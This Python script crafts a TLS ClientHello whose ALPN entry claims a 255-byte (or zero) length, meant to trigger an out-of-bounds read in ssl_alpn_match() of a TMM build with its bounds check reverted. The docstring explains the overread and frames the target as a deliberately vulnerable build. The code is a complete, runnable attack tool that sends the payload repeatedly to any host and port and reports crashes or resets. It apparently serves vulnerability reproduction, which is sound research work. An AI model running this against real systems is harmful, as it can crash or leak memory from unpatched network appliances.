#!/usr/bin/env python3
"""Craft a TLS ClientHello whose ALPN extension drives an out-of-bounds read.

TARGETS the defect reverted into tmm:vuln-alpn --- the bounds check commit
c806f1b2e8 added to ssl_alpn_match(). See substrate/VULNERABLE-BUILD.md. A
patched TMM is unaffected; this is not an exploit for any shipped release.

WHERE THE READ HAPPENS, because it is NOT where it first looks. After the
extension header is skipped:

    alpn_ext    += sizeof(struct ssl_extension) + 2;   /* 4 + 2 */
    alpn_ext_sz -= sizeof(struct ssl_extension) + 2;
    for (ix = 0; ix < alpn_ext_sz; ix += 1 + alpn_ext[ix])
        ... memcmp(alpn_ext + ix, ..., alpn_ext[ix] + 1) ...

the loop CONDITION is fine --- a huge stride just ends the loop early. The
overread is inside the body: at a valid index near the end of the buffer, the
entry's own length byte is used as a memcmp length. So the payload is a list
whose LAST entry sits in bounds and declares a length far past the end.

    ... [0x01 'h'] [0xFF]        <- ix valid, length 255, 0 bytes follow
                                    memcmp reads 256 bytes from a ~2-byte tail

A length of zero is the other invalid case RFC 7301 forbids; --mode zero sends
that instead.

The declared ALPN list length is kept HONEST (it matches the bytes actually
sent), so the malformation is purely the per-entry length byte. A wrong list
length would be rejected earlier by ssl_ext_get_by_type and never reach the loop
--- which would look like the shield working when nothing was ever triggered.
"""
import argparse
import os
import socket
import struct
import sys


def ext(etype, body):
    return struct.pack(">HH", etype, len(body)) + body


def alpn_extension(mode):
    """ALPN (RFC 7301, type 16). Entries are [len][bytes]."""
    if mode == "oob":
        # one well-formed entry, then a final entry claiming 255 bytes with none
        entries = b"\x02h2" + b"\xff"
    elif mode == "zero":
        entries = b"\x02h2" + b"\x00"          # zero-length entry: invalid
    else:                                       # "clean" --- the control
        entries = b"\x02h2" + b"\x08http/1.1"
    # list length is truthful; only the entry length byte is malformed
    return ext(16, struct.pack(">H", len(entries)) + entries)


def sni_extension(host):
    name = host.encode()
    entry = b"\x00" + struct.pack(">H", len(name)) + name
    return ext(0, struct.pack(">H", len(entry)) + entry)


def client_hello(host, mode):
    body = b""
    body += b"\x03\x03"                         # TLS 1.2
    body += os.urandom(32)                      # random
    body += b"\x00"                             # no session id
    ciphers = struct.pack(">HHH", 0x1301, 0xC02F, 0x002F)   # a few real suites
    body += struct.pack(">H", len(ciphers)) + ciphers
    body += b"\x01\x00"                         # compression: null

    exts = sni_extension(host)
    exts += ext(0x000B, b"\x01\x00")            # ec_point_formats
    exts += ext(0x000A, struct.pack(">HHH", 4, 0x001D, 0x0017))  # supported_groups
    exts += ext(0x000D, struct.pack(">HHH", 4, 0x0403, 0x0804))  # sig algs
    exts += alpn_extension(mode)
    body += struct.pack(">H", len(exts)) + exts

    hs = b"\x01" + struct.pack(">I", len(body))[1:] + body      # 3-byte length
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host")
    ap.add_argument("-p", "--port", type=int, default=443)
    ap.add_argument("-m", "--mode", choices=["oob", "zero", "clean"], default="oob",
                    help="oob: entry length past the buffer (default). "
                         "zero: zero-length entry. clean: control, valid ALPN")
    ap.add_argument("-n", "--count", type=int, default=1)
    ap.add_argument("--sni", default="demo.local")
    ap.add_argument("--dump", action="store_true", help="print the hello and exit")
    a = ap.parse_args()

    ch = client_hello(a.sni, a.mode)
    if a.dump:
        print(f"mode={a.mode}  {len(ch)} bytes")
        print(ch.hex())
        return 0

    for i in range(a.count):
        s = socket.socket()
        s.settimeout(5)
        try:
            s.connect((a.host, a.port))
            s.send(ch)
            try:
                rsp = s.recv(64)
                # A patched TMM answers the handshake (ServerHello 0x16, or an
                # alert 0x15). Silence or a reset is what a fault looks like.
                kind = {0x16: "handshake", 0x15: "alert"}.get(rsp[0] if rsp else -1,
                                                              "other")
                print(f"  [{i+1}] {len(rsp)} bytes back ({kind})"
                      if rsp else f"  [{i+1}] EMPTY --- peer closed without replying")
            except socket.timeout:
                print(f"  [{i+1}] TIMEOUT --- no response")
        except ConnectionResetError:
            print(f"  [{i+1}] CONNECTION RESET")
        except OSError as e:
            print(f"  [{i+1}] {e}")
        finally:
            s.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
